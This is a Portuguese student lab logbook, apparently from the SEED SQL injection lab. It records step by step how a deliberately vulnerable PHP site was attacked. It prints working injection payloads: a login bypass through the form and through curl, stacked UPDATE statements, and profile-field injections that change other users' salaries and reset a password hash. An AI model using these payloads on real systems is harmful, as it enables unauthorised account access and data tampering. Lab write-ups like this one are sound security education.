# LOGBOOK9.md

## Task1

Esta primeira task tem como objectivo ajudar-nos a familiarizar-nos com SQL.

Para tal, após darmos setup ao Lab devemos aceder a todas as informações guardadas na database relacionadas com o user Alice.

Para isso corremos a seguinte query:

```sql
Select * from credentials where Name = "Alice";
```

obtendo os seguintes resultados:

![image1](images\image1_log9.png)

Tal como pretendiamos.

## Task2

Na segunda task devemos dar aceder a uma conta no site dado usando SQL Injection

Primeiro devemos analisar o código em `unsafe_home.php` e verificamos que a query usada para ir buscar o user dependendo do `name` e `password` é pouco segura, pois não verifica o input o que o torna vulnerável a SQL Injection

```sql
 SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password 
			  FROM credentials
        WHERE name= '$input_uname' and Password='$hashed_pwd';
```

Para conseguirmos dar login sem sabermos a password temos de alterar a query para que nos permita aceder sem verificar a password.

para isso temos de obrigar a query a terminar antes de verificar a password. Adicionando um `‘` após  darmos input ao nome e comentando o resto da query com `—` .

A Query será chamada assim:

```sql
SELECT * FROM credentials where name='$input_name'; -- and Password = '$hashed_pwd';
```

Assim executamos o exploit.

### 2.1

Realizar o ataque através do site `www-seed-server.com:`

sabendo que `$input_name` é o valor que escrevermos em username:

![image2](images\image2_log9.png)

![image3](images\image3_log9.png)

### 2.2

Devemos agora aceder usando a command line para executar o exploit

Para tal devemos usar o comando `curl` que nos permite fazer request a um URL.

Para colocarmos `‘` e espaços temos de usar `%20` e `%27`, pois alguns caracteres especias têm de ser encoded.

```sql
curl "www.seed-server.com/unsafe_home.php?username=Alice%27;%20--%20"
```

correndo isto no terminal

![image4](images\image4_log9.png)

![image5](images\image5_log9.png)

Ganhamos acesso ao site através do terminal.

### 2.3

Para conseguirmos dar update à database devemos usar a mesma lógica anterior e introduzir uma query que atualize a database usando `UPDATE`.

```sql
Select * from credential where name = '%input_name'; 
Update credential set nickname='$input_nickname',
email='$input_email',
address='$input_address',
Password='$hashed_pwd',
PhoneNumber='$input_phonenumber'
WHERE ID='$id'; -- Password = '$hashed_'
```

podemos passar os seguintes valores

```sql
Alice'; Update credential set nickname = 'NovoNickname',
email = 'NovoEmailAlice',
address = 'NovoAdress',
Password = 'NovaPass',
PhoneNumber  = 1234456789
where ID=1; -- 
```

quando introduzimos o código surge o seguinte erro : 

![image6](images\image6_log9.png)

Este erro surge porque o código só espera um único statement por query:

no código é usado `$conn→query($sql)` o que só permite executar um statement, daí retornar um erro. Para podermos executar mais que um statement devemos alterar o código e  `$conn→multi_query($sql)` de modo a que permita correr mais do que uma query.

![image7](images\image7_log9.png)

Após fazermos esta alteração, correr o server de novo e voltar a tentar o exploit conseguimos finalmente aceder à conta com as informações alteradas:

![image8](images\image8_log9.png)

## Task3

O exploit da SQL Injection num UPDATE é bastante mais grave, visto que pode editar diretamente a base de dados.

### 3.1

Para fazermos login na conta da Alice e alterarmos o seu salário através da edição no perfil, é necessário iniciar sessão com o username Alice e a password `seedalice` (que obtivemos através da desencriptação `SHA1`) , navegando depois para a página do perfil.

Sabendo que a coluna na tabela é “salary”, podemos usá-la para injetar um salário num dos campos de input (por exemplo, o número de telefone), usando ', salary=`'9999999` .

```sql
UPDATE credential SET
nickname='$input_nickname',
email='$input_email',
address='$input_address',
Password='$hashed_pwd',
PhoneNumber=933667378,Salary=9999999 WHERE ID=$id;
```

![image9](images\image9_log9.png)

Assim, alteramos o valor do salário da Alice.

![image10](images\image10_log9.png)

### 3.2

De maneira semelhante, usamos uma query para alterar o o salário de outra pessoa. Neste caso, como vamos alterar o salário do Ryan, podemos acrescentar à query `Where Name='Ryan'; -- '` .

```sql
PhoneNumber='', salary='1' WHERE Name='Ryan'; --
```

```sql
UPDATE credential SET
nickname='$input_nickname',
email='$input_email',
address='$input_address',
Password='$hashed_pwd',
PhoneNumber='',Salary='-111111' WHERE Name='Ryan'# WHERE ID=$id;
```

![image11](images\image11_log9.png)

Depois disto, clicamos para guardar a edição de perfil.

Ao sair da conta e entrar no site com a conta do Ryan, podemos verificar que o seu novo salário é, de facto, o que definimos.

![image12](images\image12_log9.png)

### 3.3

Para podermos alterar a palavra passe de outro utilizar, temos de iniciar sessão primeiro, portanto iniciamos sessão na conta da Alice.

Visto as passwords serem guardadas na base de dados como hash em vez de plain text, ciframos o valor que queremos que seja a nova palavra passe do Boby (NovaPasse) com criptografia SHA1 - `96001b804a28c9aeb0ae597319ca2039ab36ba83` **.**

```sql
UPDATE credential SET
nickname='$input_nickname',
email='$input_email',
address='$input_address',
Password='$hashed_pwd',
PhoneNumber='', password='96001b804a28c9aeb0ae597319ca2039ab36ba83' WHERE name='Boby'# WHERE ID=$id;
```

![image13](images\image13_log9.png)

E assim conseguimos aceder à conta do Boby, como podemos ver pelo URL, com a palavra-passe `NovaPasse`.

![image14](images\image14_log9.png)